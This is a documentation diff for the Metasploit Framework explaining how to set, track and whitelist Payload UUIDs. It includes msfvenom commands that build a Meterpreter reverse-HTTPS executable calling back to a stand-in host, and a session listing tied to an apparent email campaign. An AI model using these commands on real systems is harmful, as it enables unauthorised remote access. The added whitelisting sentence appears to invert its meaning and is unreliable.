@@ -7,6 +7,8 @@ The goal of Payload UUIDs is three-fold:
  * Drop connections that do not match known UUIDs. This allows a listener to be setup that only allows known sessions to connect, which is important when running internet-facing payload handlers.
  * Enable universal handlers. The embedded platform and architecture identifiers allow the listener to determine what type of stage to send back to a stager. This will eventually allow for a single listener to be used with multiple exploits, even those that target different platforms and architectures.
 
+### Specifying the UUID
+
 Although Payload UUIDs are normally random, it is possible to specify a static UUID value using the ```PayloadUUIDRaw``` option. This option takes a 8-byte hex string, such as "0011223344556677". For example:
 ```
 $ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDRaw=4444444444444444 -f exe -o payload.exe
@@ -17,6 +19,7 @@ Instead of specifying a static UUID as the raw 8-byte value, it is also possible
 $ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDSeed=ShellsAreDelicious -f exe -o payload.exe
 ```
 
+### Tracking the UUID
 
 Payload UUIDs are enabled by default, but are not tracked unless the ```PayloadUUIDTracking``` option is set to ```true```. Setting this option causes a new entry to be created in ```~/.msf4/payloads.json``` when any UUID-enabled payload is generated. It is also possible to create a local-only name for a given UUID using the ```PayloadUUIDName```. The example below will create a new registered payload with a custom name:
 
@@ -59,4 +62,9 @@ Active sessions
    MachineID: 1fd541d2c4278e2d0c1b02f17f142f2b
      CheckIn: 1s ago @ 2015-06-25 17:12:47 -0700
   Registered: Yes - Name="EmailCampaign20150101"
-```
+  ```
+
+### Whitelisting UUIDs
+
+The ```~/.msf4/payloads.json``` file can also be used as a whitelist. This makes it possible to run a listener on a common port on a public IP address without the Metasploit Framework instance being flooded with bogus sessions. To enable whitelisting, set the ```IgnoreUnknownPayloads``` option to ```true``` in the handler instance. Any incoming request that does match both a registered Payload UUID and one of the pre-generated URLs will be ignored.
+
